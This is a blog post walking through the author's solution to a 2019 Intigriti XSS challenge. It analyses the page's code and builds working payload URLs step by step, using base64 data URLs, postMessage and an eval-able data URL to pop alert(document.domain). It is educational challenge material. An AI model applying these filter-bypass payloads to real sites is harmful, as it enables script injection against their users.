---
layout: post
title:  "Intigriti XSS Challenge - Solution and problem solving approach"
date:   2019-05-02
author: dee-see
categories: intigriti xss
---

[Intigriti](https://www.intigriti.com/public/) released a fun little [XSS challenge](https://challenge.intigriti.io) that required to craft a special URL that would be both used to assign an `iframe`'s `src` as well as being sent to an `eval` call to pop an `alert(document.domain)` - which was the objective of the challenge. But how do we get there? Let's take a step back and walk our way through it.

**Note:** The final vulnerability only works in Chrome, so if you want to follow along I would recommend using that.

## Analyzing the code

It's not time to think about XSS or exploitation yet, first we have to understand the Javascript code we're up against.

```javascript
const url = new URL(decodeURIComponent(document.location.hash.substr(1))).href.replace(/script|<|>/gi, "forbidden");
const iframe = document.createElement("iframe"); iframe.src = url; document.body.appendChild(iframe);
iframe.onload = function(){ window.addEventListener("message", executeCtx, false);}
function executeCtx(e) {
  if(e.source == iframe.contentWindow){
    e.data.location = window.location;
    Object.assign(window, e.data);
    eval(url);
  }
}
```

1. The code takes the `hash` of the current page's url (whatever follows the #), decodes URL entities from it and then replaces any instance of "script", "<" or ">" by the string "forbidden". The result of that is assigned to an `url` variable
2. An iframe is created in the current page and its `src` is the `url` that was just created, effectively loading that URL into the `iframe`
3. When the `iframe` is done loading, we start listening to `message` events and call `executeCtx` whenever that even is raised
4. The `executeCtx` function is defined
   1. The function makes sure the event comes from the `iframe`
   2. The event's payload's `location` property is overwritten with the current `windows`'s `location`, presumably to protect again redirection to another URL
   3. Every property from the payload object is assigned to the `window` with the `Object.assign(window, e.data)` line (this means that whatever I send to `executeCtx` will be defined in the `window`... very interesting)
   4. The `url` variable is `eval`'ed

After reading that code, my first question was: what is the `message` event? Turns out there is an API for cross-origin communications that uses `window.postMessage` and that allows you to send objects to anyone listening to the `message` event. That's new to me, interesting!

## Getting XSS is not important yet

So we know the objective is to get an XSS and that `eval(url)` is obviously our target. At first I have absolutely no idea how the `url` is going to give us XSS but I don't give too much attention to that for now. My current goal is simply to reach that `eval`. There are many steps I have to take until I can get anything to that `eval` call so let's do that first and once I'm there I will be able to assess what's available to me in order to get that XSS. Until then, let's forget about it.

## Step by step to the exploit

### Getting JavaScript in the `iframe`

Maybe it's the experience starting to kick in, but my first reflex for these challenges is to go for a [data URL](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs). Data URLs allow us to base64-encode our payload so that it conveniently bypasses the `.replace(/script|<|>/gi, "forbidden")` filter.

I try [https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=](https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=), which is base64 for `<script>alert('hi');</script>` and I get my `alert`! However `alert(document.domain)` doesn't work from inside the `iframe` because it's a data URL and doesn't have a domain. We have an `alert` box but I want to pop it from outside of the `iframe` so I'm far from the end.

### Posting a message to the parent `window`

The objective still being to reach that `eval(url)`, I need to post a message now to run the `executeCtx` function. So I'm trying this API I just learned about with the following script: `<script>window.postMessage("test", "*")</script>`. The second argument of the `postMessage` function is the target origin, I read that it's bad practice to put `"*"` as anyone will be able to intercept my message but I don't really care as far as this challenge is concerned. So this results in the following URL: [https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+](https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+).

...Nothing. I have a breakpoint in `executeCtx` and I don't hit it. Let's go back to MDN to read how the `postMessage` function is called.

> *`targetWindow`*`.postMessage(`*`message`*`, `*`targetOrigin`*`, [`*`transfer`*`]);`
>
> *targetWindow*  
> A reference to the window that will receive the message. Methods for obtaining such a reference include:

Ah! `postMessage` has to be called on the window receiving the message. A little modification to the payload will do the trick: `<script>window.parent.postMessage("test", "*")</script>`. I want the message to be received by the main `window` so from the `iframe` that's `window.parent`. The new URL is [https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg](https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg).

Yes! Now I get a JavaScript error from inside `executeCtx`.

```
(index):31 Uncaught TypeError: Failed to set an indexed property on 'Window': Index property setter is not supported.
    at Function.assign (<anonymous>)
    at executeCtx ((index):31)
```

This is because the data is a string and we're running into issues on the `Object.assign(window, e.data);` line. Let's just send an empty object to begin with. The payload `<script>window.parent.postMessage({}, "*")</script>` results in the URL [https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+](https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+)

The result is `Uncaught SyntaxError: Unexpected end of input` thrown by the `eval(url)` line. So it's unable to parse valid javascript out of the `url` variable which has the value `data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+`. That doesn't look like JavaScript to me either!

### Turning the URL into JavaScript

Now the objective is to get the `eval(url)` to parse valid JavaScript (I'm not thinking about XSS yet). I know pretty much anything can be valid JavaScript (see [JSFuck](http://www.jsfuck.com/) if you need to be convinced) so I stepped out of the challenge page for a minute and ran `eval('data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+')` in my console. Same error, as expected. "Unexpected end of input" means that the parser was expecting another token but reached the end of the string. My URL ends with a `+` which doesn't really make a lot of sense as a final character in a JavaScript expression so let's remove it. It will make my base64 string invalid but we'll come back to that later.

```javascript
> eval('data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ')
VM42:1 Uncaught ReferenceError: text is not defined
    at eval (eval at <anonymous> ((index):1), <anonymous>:1:6)
    at <anonymous>:1:1
```

`text` is not defined? What? At first I didn't get where the `text` was coming from but I rolled with it. Ok sure... I ran `text = 1` then reran my `eval`.

```javascript
> text = 1
1
> eval('data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ')
VM70:1 Uncaught ReferenceError: html is not defined
    at eval (eval at <anonymous> ((index):1), <anonymous>:1:11)
    at <anonymous>:1:1
```

`html`? Oh! That's right! The URL without the `+` at the end **is** valid javascript. Still don't see it? Here is the URL with indentation and comments:

```javascript
data: // a label for a goto
text/html; // divides the variable text by the variable html
base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ // evalutes the base64 variable and the PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ variable then returns the latter (see , operator)
```

It certainly isn't coherent code, but it is valid JavaScript code (which I guess can be said about a lot of codebases, but I'm getting sidetracked). The `+` at the end of my string is simply a base64 artifact. I'll continue working on my payload and if the final character is `+` I'll add garbage until the result of base64 encoding ends with a letter which will make it a valid variable name.

### Finally time to think about that XSS

So now I can call that `eval` with something that ressembles JavaScript... where do I put my `alert(document.domain)`? Once again I go back to trusty [MDN](https://developer.mozilla.org/) to read more about data URLs and where I could put my `alert`.

> `data:[<mediatype>][;base64],<data>`
>
> The `mediatype` is a MIME type string, such as `'image/jpeg'` for a JPEG image file. If omitted, defaults to `text/plain;charset=US-ASCII`

That `;charset=US-ASCII` grabs my attention. Maybe I can put my payload in there? It even looks like a JavaScript variable assignment! So I try this in my console

```javascript
> text = 1
1
> html = 1
1
> eval('data:text/html;charset=alert(1);base64,whatever')
Uncaught ReferenceError: base64 is not defined
    at eval (eval at <anonymous> ((index):1), <anonymous>:1:33)
    at <anonymous>:1:1
```

YES! The `alert` pops! It complains about `base64` not being defined but that happens after the `alert` so I don't care. Time to try it on the website! I change my payload to `<script>window.parent.postMessage({text:1, html:1, base64:1}, "*")</script>hi intigriti`. Remember the `Object.assign(window, e.data)` line that will take my posted message to define the `text` and `html` variables (I defined `base64` but it wasn't necessary). The `hi intigriti` at the end is simply to get rid of the `+` at the end of my base64 encoded payload. :)

The resulting URL is [https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp](https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp) and... it doesn't work.

What's great about data URLs is that you can put them in your address bar and see the result. This data URL `data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp` shows a "This site can't be reached" message. I played with it a bit and discovered that the parentheses in `alert(1)` are breaking everything.

### The final step

I was so close! But my `alert` doesn't run... I spent a ridiculous amout of time trying alternate ways to invoke the function without parentheses until it occured to me that maybe I don't need any of that `charset=` thing and maybe removing it could bypass the character validations that are breaking my URL. Now trying with [https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp](https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp) and the `alert(1)` pops! This is it, one final modification and this is it.

[https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp](https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp)

![Final payload]({{ '/images/intigriti_xss_victory.png' | absolute_url }})

Victory!

**Note:** This morning my chrome was updated and the URL above doesn't work 100% of the time. I didn't test extensively but I think it's because the `iframe` is loaded before the `message` event listener is hooked. Adding a `setTimeout` to delay the `postMessage` call would probably fix the issue as suggested by [@ephreet](https://twitter.com/ephreet1/status/1124220724770738176).

## Conclusion

This was as much of a code review challenge as it was an XSS challenge. My key takeaways:

- Understanding how the code you're hacking works goes a long way!
- Don't concentrate too much on the end goal, plan intermediate steps and aim for those instead
- Don't panic when you have no idea how you're going to solve the challenge (How the &@#^ am I going to get an XSS out of `eval(url)` ???), solve each step and the solution will become clearer

Thank you [@intigriti](https://twitter.com/intigriti/) I had a ton of fun! Congrats to everyone and good luck for the prize!
